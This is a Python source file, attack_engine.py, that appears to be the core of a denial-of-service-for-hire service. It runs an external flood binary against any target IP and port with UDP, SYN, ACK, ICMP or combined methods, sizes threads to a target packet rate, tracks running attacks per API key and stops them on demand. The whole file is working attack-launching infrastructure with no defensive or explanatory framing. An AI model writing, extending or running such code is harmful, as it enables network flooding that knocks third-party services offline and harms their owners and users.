# attack_engine.py
import subprocess
import threading
import time
import os
import signal
from typing import Dict, Optional
from datetime import datetime
from database import db

class AttackEngine:
    def __init__(self, binary_path="./neutron"):
        self.binary_path = binary_path
        self.active_attacks: Dict[str, subprocess.Popen] = {}
        self.active_attacks_info: Dict[str, dict] = {}
        
        if os.path.exists(binary_path):
            os.chmod(binary_path, 0o755)
    
    def calculate_threads(self, target_pps: int) -> int:
        """Calculate threads needed for target PPS (125k PPS per thread)"""
        threads = max(4, (target_pps + 125000 - 1) // 125000)
        return min(threads, 64)
    
    def calculate_bandwidth(self, threads: int) -> float:
        """Calculate bandwidth from threads"""
        return threads * 0.125
    
    def execute_attack(self, attack_id: str, target_ip: str, target_port: int,
                       duration: int, threads: int = 12, method: int = 0) -> bool:
        """Execute attack using C binary"""
        
        cmd = [self.binary_path, target_ip, str(target_port), str(duration), str(threads), str(method)]
        
        try:
            if hasattr(os, 'setsid'):
                process = subprocess.Popen(cmd, preexec_fn=os.setsid)
            else:
                process = subprocess.Popen(cmd)
            
            self.active_attacks[attack_id] = process
            self.active_attacks_info[attack_id] = {
                "target_ip": target_ip,
                "target_port": target_port,
                "duration": duration,
                "threads": threads,
                "method": method,
                "started_at": time.time()
            }
            
            def monitor():
                process.wait()
                db.update_attack_status(attack_id, "completed")
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
                if attack_id in self.active_attacks_info:
                    del self.active_attacks_info[attack_id]
            
            threading.Thread(target=monitor, daemon=True).start()
            return True
            
        except Exception as e:
            print(f"Attack failed: {e}")
            return False
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop specific attack"""
        if attack_id in self.active_attacks:
            try:
                process = self.active_attacks[attack_id]
                if hasattr(os, 'killpg'):
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                else:
                    process.terminate()
                
                time.sleep(0.5)
                if process.poll() is None:
                    if hasattr(os, 'killpg'):
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                    else:
                        process.kill()
                
                db.update_attack_status(attack_id, "stopped")
                del self.active_attacks[attack_id]
                del self.active_attacks_info[attack_id]
                return True
            except Exception as e:
                print(f"Error stopping attack: {e}")
                return False
        return False
    
    def stop_all_attacks(self, api_key: str = None) -> int:
        """Stop all or specific API key attacks"""
        count = 0
        attacks_to_stop = list(self.active_attacks.keys())
        
        if api_key:
            # Filter by API key
            attacks_to_stop = [aid for aid in attacks_to_stop if aid in self.active_attacks_info]
        
        for attack_id in attacks_to_stop:
            if self.stop_attack(attack_id):
                count += 1
        return count
    
    def get_active_attacks(self, api_key: str = None) -> Dict:
        """Get active attacks"""
        attacks = {}
        for attack_id, info in self.active_attacks_info.items():
            elapsed = time.time() - info["started_at"]
            remaining = max(0, info["duration"] - elapsed) if info["duration"] > 0 else 0
            attacks[attack_id] = {
                "status": "running",
                "target": f"{info['target_ip']}:{info['target_port']}",
                "duration": info["duration"],
                "remaining": remaining if info["duration"] > 0 else "continuous",
                "threads": info["threads"],
                "method": ["UDP", "SYN", "ACK", "ICMP", "ALL"][info["method"]],
                "bandwidth_gbps": info["threads"] * 0.125,
                "pps": info["threads"] * 125000,
                "elapsed_seconds": int(elapsed)
            }
        
        if api_key:
            # Filter by API key (would need mapping)
            pass
        
        return attacks

attack_engine = AttackEngine()
